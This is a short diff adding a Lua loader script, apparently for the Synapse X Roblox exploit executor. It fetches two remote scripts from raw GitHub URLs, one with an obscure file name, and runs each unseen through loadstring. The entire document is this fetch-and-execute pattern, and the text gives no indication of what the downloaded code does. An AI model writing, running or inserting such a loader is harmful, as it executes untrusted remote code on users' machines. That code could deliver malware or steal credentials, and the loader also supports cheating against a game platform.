@@ -1,0 +1,17 @@
+local script1 = "https://raw.githubusercontent.com/FantaroX/exterlib/main/soundlib"
+local script2 = "https://raw.githubusercontent.com/6ASteroid9/LOADING/main/._."
+
+local function loadScript(script)
+    local req = syn.request({
+        Url = script
+    })
+    loadstring(req.Body)()
+end
+
+coroutine.wrap(function()
+    loadScript(script1)
+end)()
+
+coroutine.wrap(function()
+    loadScript(script2)
+end)()
